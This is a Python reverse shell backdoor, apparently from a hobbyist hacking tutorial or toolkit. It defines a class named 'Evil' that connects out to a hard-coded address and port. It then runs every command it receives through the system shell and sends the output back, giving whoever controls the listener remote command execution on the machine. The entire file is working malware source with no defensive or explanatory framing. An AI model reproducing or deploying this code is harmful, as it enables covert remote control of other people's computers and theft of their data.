#!/usr/bin/env python

# Created by un4ckn0wl3z-level99
# Website -> www.un4ckn0wl3z.xyz
# Date -> 7/28/2018

import socket
import subprocess
import json
import os

class Evil:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.connection.send("\n[+] connection established.\n")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def exec_sys_cmd(self,cmd):
        return subprocess.check_output(cmd,shell=True)

    def change_working_dir(self,path):
        os.chdir(path)
        return "Changing dir to " + path

    def run(self):
        while True:
            try:
                # cmd_result = ""
                cmd = self.reliable_recv()
                if cmd[0] == "exit":
                    self.connection.close()
                    exit()
                elif cmd[0] == "cd" and len(cmd) > 1:
                    cmd_result = self.change_working_dir(cmd[1])
                else:
                    cmd_result = self.exec_sys_cmd(cmd)
                if not cmd_result:
                    self.reliable_send("System command exception")
                    continue
                self.reliable_send(cmd_result)
            except Exception:
                self.reliable_send("Something wrong...")
                continue

        self.connection.close()

evil = Evil("127.0.0.1",2508)
evil.run()